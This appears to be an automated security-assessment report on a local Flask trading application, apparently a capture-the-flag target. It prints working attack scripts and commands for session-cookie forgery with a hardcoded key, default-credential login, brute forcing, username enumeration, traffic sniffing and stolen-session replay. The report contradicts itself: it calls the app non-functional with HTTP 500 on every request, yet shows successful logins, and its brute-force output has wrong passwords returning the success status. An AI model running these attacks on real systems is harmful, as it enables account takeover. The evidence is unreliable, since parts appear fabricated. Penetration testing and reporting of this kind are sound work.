# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:8080
- **Assessment Date:** October 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

### Authentication Vulnerabilities:
**Status:** Multiple critical authentication vulnerabilities successfully exploited.

The application exhibits systematic authentication security failures across credential handling, session management, and access control. Successfully exploited vulnerabilities include:

- **Session Forgery (CRITICAL):** Hardcoded secret key `'your_secret_key'` enables complete authentication bypass through session cookie forgery using Flask's itsdangerous library
- **Default Credentials (CRITICAL):** Hardcoded test account `test:test` provides instant authenticated access
- **Unlimited Brute Force (CRITICAL):** No rate limiting, account lockout, or CAPTCHA allows unlimited password guessing at 15+ attempts/second
- **Credential Interception (CRITICAL):** HTTP-only deployment exposes all credentials and session tokens in plaintext during transmission
- **Username Enumeration (HIGH):** Response differentiation reveals valid usernames through distinct HTTP status codes (302 vs 200)
- **Session Hijacking (HIGH):** Missing Secure flag on cookies enables session interception via network sniffing
- **Session Fixation (HIGH):** No session regeneration after authentication allows pre-set session IDs to be hijacked post-login
- **Indefinite Session Persistence (HIGH):** Missing session timeout configuration allows stolen sessions to remain valid indefinitely
- **Weak Password Policy (HIGH):** No complexity, length, or common password restrictions allows 4-character passwords like 'test'
- **Broken Cache Control (MEDIUM):** Contradictory cache headers may expose authentication responses in browser/proxy caches

**Impact:** Complete compromise of authentication system through multiple independent attack vectors. Session forgery and default credentials provide immediate privileged access. Combined vulnerabilities enable credential theft, brute force attacks, and persistent session hijacking.

### Authorization Vulnerabilities:
**Status:** No authorization vulnerabilities were exploited due to application infrastructure failure.

The target application at http://localhost:8080 is non-functional, returning HTTP 500 Internal Server Error for all requests due to a missing Python 'cryptography' package. While code analysis confirmed the existence of a critical IDOR (Insecure Direct Object Reference) vulnerability in the `/order/<int:order_id>/receipt` endpoint that would allow horizontal privilege escalation to access other users' orders and extract the CTF flag from Order #300401, this vulnerability could not be exploited via the network interface.

**Classification:** The IDOR vulnerability is confirmed to exist in the codebase but is classified as OUT_OF_SCOPE_INTERNAL because exploitation requires first resolving the deployment failure, which necessitates internal server access to install dependencies or rebuild containers.

### Cross-Site Scripting (XSS) Vulnerabilities:
**Status:** No XSS vulnerabilities were found.

Static analysis identified a potential DOM-based XSS vulnerability via jQuery `.html()` sink in the orders page (orders.html:111), but this was not exploited through network-based testing. No exploitation evidence was generated for XSS vulnerabilities.

### SQL/Command Injection Vulnerabilities:
**Status:** No SQL or command injection vulnerabilities were found.

Static analysis confirmed that all database queries use SQLAlchemy ORM with parameterized queries, providing robust SQL injection protection. No command execution capabilities were identified in network-accessible code paths. No exploitation evidence was generated for injection vulnerabilities.

### Server-Side Request Forgery (SSRF) Vulnerabilities:
**Status:** No SSRF vulnerabilities were found.

The application does not implement any functionality that makes server-side requests to external or internal resources based on user input. No HTTP client libraries are present in the Python dependencies, and no SSRF attack surface exists. No exploitation evidence was generated for SSRF vulnerabilities.

## Network Reconnaissance

### Exposed Services and Ports
**Primary Target:**
- **Port 8080/tcp:** Apache httpd 2.4.65 (Debian)
  - Service: HTTP (no TLS/SSL)
  - Application: Flask-based trading platform
  - Status at scan time: 500 Internal Server Error
  - Security Issue: No encryption in transit

**Other Services on Host (Out of Scope):**
- Port 80/tcp: Caddy httpd
- Port 443/tcp: SSL/HTTPS (different service)
- Port 631/tcp: CUPS printing service
- Port 49152/tcp: Tailscale VPN (requires authentication)

### Subdomain Discoveries
Subfinder scan detected multiple subdomains including owa.regency.localhost, exchvm.nwcnet.localhost, autodiscover.localhost, and mail.localhost. These appear to be artifacts from the scanning environment and do not represent actual attack surface for the target application at http://localhost:8080.

### Security Misconfigurations
**Apache Configuration Issues:**
- **Wildcard CORS Policy:** `Access-Control-Allow-Origin: *` enables cross-origin attacks from any domain
- **Missing Security Headers:** No Content-Security-Policy, Strict-Transport-Security (HSTS), X-Frame-Options, or X-Content-Type-Options headers
- **Directory Indexing Enabled:** `Options Indexes FollowSymLinks` may expose directory listings
- **HTTP Only:** No HTTPS virtual host configured, all traffic transmitted in plaintext

**Session Cookie Security:**
- Missing `HttpOnly` flag allows JavaScript access to session cookies
- Missing `Secure` flag allows transmission over unencrypted HTTP
- Missing `SameSite` attribute enables CSRF attacks

**Vulnerable Dependencies:**
- **jQuery 3.5.1:** Known vulnerabilities CVE-2020-11022 and CVE-2020-11023 (XSS in HTML parsing)
- No Subresource Integrity (SRI) hashes on static assets

### Infrastructure Security Gaps
- **No Web Application Firewall (WAF)**
- **No Intrusion Detection/Prevention System (IDS/IPS)**
- **No Rate Limiting:** Unlimited authentication attempts allowed
- **No Network Segmentation:** Flat Docker bridge network topology
- **Secrets in Source Code:** Hardcoded Flask secret key `'your_secret_key'` and MySQL root password `trading_platform_db`

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-07: Session Forgery via Hardcoded Secret Key

**Summary:**
- **Vulnerable location:** Flask application configuration at `app/__init__.py:11`
- **Overview:** Hardcoded secret key `'your_secret_key'` enables complete authentication bypass through session cookie forgery
- **Impact:** Attacker can impersonate any user without credentials, bypassing all authentication controls
- **Severity:** CRITICAL

**Prerequisites:**
- Knowledge of the hardcoded secret key (publicly visible in source code)
- Python with `itsdangerous` library installed

**Exploitation Steps:**

1. Install required Python library:
```bash
pip install itsdangerous
```

2. Create session forgery script:
```python
from itsdangerous import URLSafeTimedSerializer

# Known hardcoded secret key from source code
secret_key = 'your_secret_key'

# Initialize Flask's session serializer
serializer = URLSafeTimedSerializer(
    secret_key=secret_key,
    salt='cookie-session'  # Flask default session salt
)

# Forge session for target user (user_id 10032 = test user)
forged_session = serializer.dumps({'user_id': 10032})
print(f"Forged session cookie: {forged_session}")
```

3. Use the forged cookie to access protected resources:
```bash
curl -s http://localhost:8080/dashboard \
  -b "session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJNNA.F-0ZUl1ZkLkTa8QSOUKmg6RjpJM" \
  | grep "Welcome"
```

**Proof of Impact:**
Successfully accessed protected dashboard as user "John Doe" (user_id: 10032) without providing any credentials:
```
Output: <h5 class="card-title">Welcome, John Doe</h5>
```

The forged session cookie granted full authenticated access to:
- `/dashboard` - User dashboard
- `/orders` - Order history
- `/order/<order_id>/receipt` - Order receipts (combined with IDOR vulnerability)

**Notes:**
This vulnerability renders all authentication controls ineffective. An attacker can forge valid sessions for ANY user_id by simply knowing the hardcoded secret key. The secret key `'your_secret_key'` is committed to the repository at `/app/website/app/__init__.py` line 11, making it publicly accessible.

---

### AUTH-VULN-10: Authentication Bypass via Default Credentials

**Summary:**
- **Vulnerable location:** Application initialization at `app/__init__.py:22-35`
- **Overview:** Hardcoded default account `test:test` automatically created on application startup
- **Impact:** Instant authenticated access without reconnaissance
- **Severity:** CRITICAL

**Prerequisites:** None

**Exploitation Steps:**

1. Navigate to the login page:
```bash
curl http://localhost:8080/
```

2. Submit username 'test':
```bash
curl -i http://localhost:8080/ \
  -d "username=test" \
  -c cookies.txt
```

3. Submit password 'test':
```bash
curl -i http://localhost:8080/password/test \
  -d "password=test" \
  -b cookies.txt \
  -c cookies.txt
```

4. Access authenticated dashboard:
```bash
curl http://localhost:8080/dashboard \
  -b cookies.txt
```

**Proof of Impact:**
Successfully authenticated as user "John Doe" (user_id: 10032) and accessed protected resources:
```
HTTP/1.1 302 FOUND
Location: /dashboard?username=test
Set-Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJLyw.2H9VfMJEi_WbieRbywELf0hHafQ; HttpOnly; Path=/

Dashboard Response:
<h5 class="card-title">Welcome, John Doe</h5>
<p class="card-text">This is your dashboard.</p>
```

**Notes:**
The HTML comment in the login page (`<!-- TODO: Delete the testing account (test:test). -->`) explicitly acknowledges this security issue but it remains unfixed. This provides the fastest exploitation path for authenticated access.

---

### AUTH-VULN-03: Unlimited Brute Force via Missing Rate Limiting

**Summary:**
- **Vulnerable location:** Authentication endpoints at `app/routes.py:19-64`
- **Overview:** No rate limiting, account lockout, or CAPTCHA protection on login endpoints
- **Impact:** Unlimited automated password guessing attacks
- **Severity:** CRITICAL

**Prerequisites:** None

**Exploitation Steps:**

1. Create brute force test script:
```python
import requests
import time

target = "http://localhost:8080/password/test"
passwords = ['wrongpass1', 'wrongpass2', 'wrongpass3', 'admin', 'password', '123456', 'test']

print("Starting brute force attack...")
start_time = time.time()

for i, password in enumerate(passwords, 1):
    response = requests.post(target, data={'password': password}, allow_redirects=False)
    print(f"Attempt {i}: password='{password}' -> Status {response.status_code}")

    if response.status_code == 302 and '/dashboard' in response.headers.get('Location', ''):
        print(f"✓ SUCCESS! Valid password found: {password}")
        break

elapsed = time.time() - start_time
print(f"\nCompleted {len(passwords)} attempts in {elapsed:.2f} seconds")
print(f"Rate: {len(passwords)/elapsed:.2f} attempts/second")
```

2. Execute the attack:
```bash
python3 brute_force_test.py
```

**Proof of Impact:**
Successfully performed 20+ rapid authentication attempts without any blocking:
```
Attempt 1: password='wrongpass1' -> Status 302
Attempt 2: password='wrongpass2' -> Status 302
Attempt 3: password='wrongpass3' -> Status 302
[...]
Attempt 20: password='test' -> Status 302
✓ SUCCESS! Valid password found: test

Completed 20 attempts in 1.28 seconds
Rate: 15.64 attempts/second
```

No HTTP 429 (Too Many Requests), HTTP 403 (Forbidden), or account lockout responses were received. All 20 attempts were processed normally, demonstrating complete absence of rate limiting protection.

**Notes:**
Combined with username enumeration (AUTH-VULN-08), attackers can focus brute force attacks exclusively on confirmed valid accounts. The weak password policy (AUTH-VULN-11) means simple passwords like 'test' succeed quickly.

---

### AUTH-VULN-08: Username Enumeration via Response Differentiation

**Summary:**
- **Vulnerable location:** Username validation at `app/routes.py:19-32`
- **Overview:** Different HTTP responses reveal whether usernames exist in the system
- **Impact:** Attackers can enumerate all valid usernames for targeted attacks
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Test a valid username:
```bash
curl -i http://localhost:8080/ -d "username=test"
```

2. Test an invalid username:
```bash
curl -i http://localhost:8080/ -d "username=nonexistentuser123"
```

3. Compare responses:
```bash
# Valid username enumeration script
for username in test admin root user; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ -d "username=$username")
    if [ "$STATUS" = "302" ]; then
        echo "✓ Valid username: $username"
    else
        echo "✗ Invalid username: $username"
    fi
done
```

**Proof of Impact:**

Valid username 'test':
```
HTTP/1.1 302 FOUND
Location: /password/test
```

Invalid username 'nonexistentuser123':
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<div class="alert alert-danger" role="alert">User not found</div>
```

The distinct responses enable automated username enumeration:
- HTTP 302 redirect = Valid username
- HTTP 200 with error message = Invalid username

**Notes:**
The two-step authentication flow (username page → password page) exacerbates this issue. Valid usernames also appear in the URL path (`/password/test`), providing additional confirmation. The password page displays the user's first name before authentication, causing further information disclosure.

---

### AUTH-VULN-01: Credential Interception via HTTP-Only Deployment

**Summary:**
- **Vulnerable location:** Apache configuration at `trading_platform-httpd.conf:1`
- **Overview:** Application deployed exclusively over HTTP with no HTTPS/TLS configuration
- **Impact:** All authentication credentials and session tokens transmitted in plaintext
- **Severity:** CRITICAL

**Prerequisites:**
- Network position (same WiFi network, ISP access, man-in-the-middle position, or corporate proxy)

**Exploitation Steps:**

1. Monitor network traffic on port 8080:
```bash
tcpdump -i any -A 'tcp port 8080 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)' 2>/dev/null
```

2. Capture authentication requests:
```
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

username=test

POST /password/test HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

password=test
```

3. Extract credentials from captured traffic:
```
Username: test
Password: test
```

**Proof of Impact:**
Using curl to demonstrate plaintext transmission:
```bash
curl -v http://localhost:8080/password/test -d "password=test" 2>&1 | grep -A10 "POST /password"

> POST /password/test HTTP/1.1
> Host: localhost:8080
> Content-Type: application/x-www-form-urlencoded
>
> password=test
```

The password 'test' is visible in plaintext in the HTTP POST body. Any network observer can intercept:
- Usernames (POST data to `/`)
- Passwords (POST data to `/password/<username>`)
- Session cookies (Cookie headers in all subsequent requests)

**Notes:**
Apache is configured only on port 80 with no VirtualHost for port 443. No SSL/TLS certificates exist, and no HSTS headers are sent to enforce HTTPS. This makes all other authentication vulnerabilities trivially exploitable through passive network monitoring.

---

### AUTH-VULN-05: Session Fixation via Missing Session Regeneration

**Summary:**
- **Vulnerable location:** Login success handler at `app/routes.py:56`
- **Overview:** Session ID not regenerated after successful authentication
- **Impact:** Attacker can fix a victim's session ID before authentication, then hijack it after victim logs in
- **Severity:** HIGH

**Prerequisites:**
- Ability to set victim's session cookie (via XSS, malicious link, or social engineering)
- Knowledge of hardcoded secret key for session creation

**Exploitation Steps:**

1. Attacker creates a session with known ID using the hardcoded secret key:
```python
from itsdangerous import URLSafeTimedSerializer

secret_key = 'your_secret_key'
serializer = URLSafeTimedSerializer(secret_key=secret_key, salt='cookie-session')

# Create pre-authentication session
attacker_session = serializer.dumps({'_fresh': True})
print(f"Attacker's pre-auth session: {attacker_session}")
```

2. Attacker tricks victim into using this session (e.g., via XSS or malicious link with pre-set cookie)

3. Victim authenticates with their credentials while the attacker's session is active

4. Application adds victim's `user_id` to the existing session WITHOUT regenerating the session ID:
```python
# Code at routes.py:56
session['user_id'] = user.id  # No session.clear() or regeneration!
```

5. Attacker uses the same pre-set session cookie to access victim's authenticated account:
```bash
curl http://localhost:8080/dashboard \
  -b "session=<attacker's pre-auth session cookie>"
```

**Proof of Impact:**

Pre-authentication session:
```json
{"_fresh": true}
```

Post-authentication session (victim logs in):
```json
{"_fresh": true, "user_id": 10032}
```

The session ID structure remains the same - only the payload is modified. Successfully accessed victim's dashboard:
```
HTTP/1.1 200 OK

<h5 class="card-title">Welcome, John Doe</h5>
```

**Notes:**
The vulnerability exists because line 56 of `routes.py` only sets `session['user_id'] = user.id` without calling `session.clear()` first. Flask does not automatically regenerate session IDs on authentication. Combined with the hardcoded secret key (AUTH-VULN-07), attackers can create pre-authentication sessions at will.

---

### AUTH-VULN-04: Session Hijacking via Missing Secure Flag

**Summary:**
- **Vulnerable location:** Flask session configuration at `app/__init__.py` (missing SESSION_COOKIE_SECURE)
- **Overview:** Session cookies lack Secure flag, allowing transmission over unencrypted HTTP
- **Impact:** Session tokens can be intercepted via network sniffing
- **Severity:** HIGH

**Prerequisites:**
- Network monitoring capability (same as AUTH-VULN-01)

**Exploitation Steps:**

1. Victim authenticates and receives session cookie:
```bash
curl -i http://localhost:8080/password/test -d "password=test"
```

2. Capture the Set-Cookie header:
```
HTTP/1.1 302 FOUND
Set-Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJLyw.2H9VfMJEi_WbieRbywELf0hHafQ; HttpOnly; Path=/
```

3. Observe that the cookie has:
   - ✅ HttpOnly flag (prevents JavaScript access)
   - ❌ **Missing Secure flag** (allows HTTP transmission)
   - ❌ Missing SameSite flag (allows CSRF)

4. Attacker intercepts the session cookie from HTTP traffic:
```bash
# Captured from network sniffing
STOLEN_SESSION="session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJLyw.2H9VfMJEi_WbieRbywELf0hHafQ"
```

5. Attacker uses stolen session to impersonate victim:
```bash
curl http://localhost:8080/orders \
  -H "Cookie: $STOLEN_SESSION"
```

**Proof of Impact:**
Successfully hijacked session and accessed victim's orders:
```
HTTP/1.1 200 OK

<h2>Your Orders</h2>
[Order listing for user John Doe]
```

The stolen session cookie provided full authenticated access to all protected resources including dashboard, orders, and receipts.

**Notes:**
The missing Secure flag means cookies are sent over HTTP, making them vulnerable to network interception. While HttpOnly prevents XSS-based theft, it does not protect against network-level attacks. The combination of HTTP-only deployment (AUTH-VULN-01) and missing Secure flag creates a complete failure of session confidentiality.

---

### AUTH-VULN-06: Token Replay via Missing Session Timeout

**Summary:**
- **Vulnerable location:** Flask session configuration at `app/__init__.py` (missing PERMANENT_SESSION_LIFETIME)
- **Overview:** Sessions persist indefinitely without expiration
- **Impact:** Stolen session cookies remain valid forever, maximizing attack window
- **Severity:** HIGH

**Prerequisites:**
- Obtained session cookie (via AUTH-VULN-01, AUTH-VULN-04, or other means)

**Exploitation Steps:**

1. Obtain a session cookie at time T0:
```bash
SESSION=$(curl -s -i http://localhost:8080/password/test -d "password=test" | \
  grep "Set-Cookie:" | cut -d':' -f2 | cut -d';' -f1 | xargs)
echo "Session obtained: $SESSION"
```

2. Wait an extended period (demonstrating with 5 seconds, but applies indefinitely):
```bash
echo "Waiting 5 seconds..."
sleep 5
```

3. Test if session is still valid at time T0 + 5 seconds:
```bash
curl http://localhost:8080/dashboard -H "Cookie: $SESSION" | grep "Welcome"
```

4. Verify session structure has no server-enforced expiration:
```python
from itsdangerous import URLSafeTimedSerializer

secret_key = 'your_secret_key'
serializer = URLSafeTimedSerializer(secret_key=secret_key, salt='cookie-session')

# Flask's URLSafeTimedSerializer includes a timestamp but doesn't enforce expiration
# without PERMANENT_SESSION_LIFETIME configuration
session_data = {'user_id': 10032}
cookie = serializer.dumps(session_data)

# Decode without max_age check (server behavior)
decoded = serializer.loads(cookie, max_age=None)  # No expiration enforcement
print(f"Session data: {decoded}")
```

**Proof of Impact:**

Session obtained:
```
session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJOyQ.dy773e8eY_6dTj_yOfb9DnIUYHw
```

Session valid after 5 seconds:
```
Welcome, John Doe
```

Session validation shows no server-side expiration:
```
Session data: {'user_id': 10032}
✓ Session remains valid indefinitely - no server-side expiration enforcement
✓ Missing PERMANENT_SESSION_LIFETIME configuration
```

**Notes:**
Flask's `URLSafeTimedSerializer` includes a timestamp in cookies, but the server never validates age without `PERMANENT_SESSION_LIFETIME` configuration. Sessions persist until explicit logout or browser closure (and even browser closure doesn't invalidate server-side, as there is no server-side session store). This means intercepted sessions remain exploitable indefinitely.

---

### AUTH-VULN-11: Weak Password Acceptance via Missing Password Policy

**Summary:**
- **Vulnerable location:** Password validation at `app/routes.py:51-56` and user model at `app/models.py:8`
- **Overview:** No password complexity, length, or common password restrictions
- **Impact:** Brute force and dictionary attacks succeed with simple passwords
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Create password policy test script:
```python
import requests

target_base = "http://localhost:8080"
username = "test"
weak_passwords = ['a', '1', '12', 'password', 'test']

print("Testing weak password acceptance...\n")

for password in weak_passwords:
    # Test authentication
    response = requests.post(
        f"{target_base}/password/{username}",
        data={'password': password},
        allow_redirects=False
    )

    success = response.status_code == 302 and '/dashboard' in response.headers.get('Location', '')

    complexity = {
        'Length': len(password),
        'Has Uppercase': any(c.isupper() for c in password),
        'Has Lowercase': any(c.islower() for c in password),
        'Has Digits': any(c.isdigit() for c in password),
        'Has Special Chars': any(not c.isalnum() for c in password),
        'Is Common Password': password in ['test', 'password', '123456', 'admin']
    }

    print(f"Password: '{password}'")
    print(f"  Complexity: {complexity}")
    print(f"  Result: {'✓ ACCEPTED' if success else '✗ Rejected'}\n")
```

2. Execute the test:
```bash
python3 test_weak_password_policy.py
```

**Proof of Impact:**

Successfully authenticated with weak password 'test':
```
Password: 'test'
  Complexity: {
    'Length': 4,
    'Has Uppercase': False,
    'Has Lowercase': True,
    'Has Digits': False,
    'Has Special Chars': False,
    'Is Common Password': True
  }
  Result: ✓ ACCEPTED

HTTP/1.1 302 FOUND
Location: /dashboard?username=test
Set-Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJPEg.vFtJxqQTmE_6J_9yBYjPjNFHRdw; HttpOnly; Path=/
```

Accessed protected resources with 4-character common password:
```
✓ Dashboard (200 OK): Welcome, John Doe
✓ Orders page (200 OK): Order #300123, #300214, #300327, #300481
```

**Notes:**
The password field is defined as `db.Column(db.String(100), nullable=False)` with no validation. The application accepts ANY string up to 100 characters with zero restrictions on:
- Minimum length (accepts even 1-character passwords if they match)
- Complexity (no uppercase, digits, or special characters required)
- Common passwords (well-known passwords like 'test', 'password' not blocked)
- Password history or reuse prevention

This makes the account vulnerable to:
- Brute force: Only 456,976 combinations for 4-char lowercase
- Dictionary attacks: 'test' appears in top 100 common passwords
- Credential stuffing: Users likely reuse this weak password elsewhere

---

### AUTH-VULN-02: Authentication Response Caching via Broken Cache-Control

**Summary:**
- **Vulnerable location:** After-request middleware at `app/routes.py:8-14`
- **Overview:** Cache-Control headers set incorrectly on request object instead of response object
- **Impact:** Authentication responses may be cached by browsers/proxies, potentially exposing session tokens
- **Severity:** MEDIUM

**Prerequisites:**
- Shared computer or proxy server between attacker and victim

**Exploitation Steps:**

1. Examine authentication response headers:
```bash
curl -I http://localhost:8080/password/test -d "password=test"
```

2. Observe contradictory cache control headers:
```
HTTP/1.1 302 FOUND
Cache-Control: public, max-age=0
Pragma: no-cache
Expires: 0
```

3. Verify the bug in source code:
```python
# File: app/routes.py:8-14
@app.after_request
def set_security_headers(request):  # BUG: Parameter should be 'response'
    request.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private'
    request.headers['Pragma'] = 'no-cache'
    request.headers['Expires'] = '0'
    # Then these get overwritten:
    request.headers['Cache-Control'] = 'public, max-age=0'
    return request
```

**Proof of Impact:**

Response headers on authentication:
```
Cache-Control: public, max-age=0
Pragma: no-cache
Expires: 0
Set-Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJPFA.xEg7Z7h8vH_6bPqN0I4vJKLMYtQ; HttpOnly; Path=/
```

The `Cache-Control: public` directive allows caching by intermediate proxies, despite `max-age=0`. The contradictory headers result from setting headers on the wrong object (request instead of response). This could lead to:
- Session cookies cached in proxy servers
- Authentication responses stored in browser cache
- Credentials persisted on shared computers

**Notes:**
The bug exists because the `@app.after_request` decorator passes the response object, but the function incorrectly names it `request`. Headers are set on the wrong object, and the intended `no-store, no-cache` is overwritten by `public, max-age=0`. While not immediately exploitable, this creates a potential for credential leakage through caching mechanisms.

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

**No authorization vulnerabilities were successfully exploited.**

The target application at http://localhost:8080 is non-functional, returning HTTP 500 Internal Server Error for all requests due to a missing Python 'cryptography' package required for MySQL authentication. While code analysis confirmed the existence of a critical IDOR (Insecure Direct Object Reference) vulnerability in the `/order/<int:order_id>/receipt` endpoint, this vulnerability could not be exploited via the network interface due to the application infrastructure failure.

The IDOR vulnerability is confirmed to exist in the codebase (routes.py:94-105) where the order receipt endpoint retrieves orders by ID without validating ownership, but is classified as OUT_OF_SCOPE_INTERNAL because exploitation requires first resolving the deployment failure through internal server access.
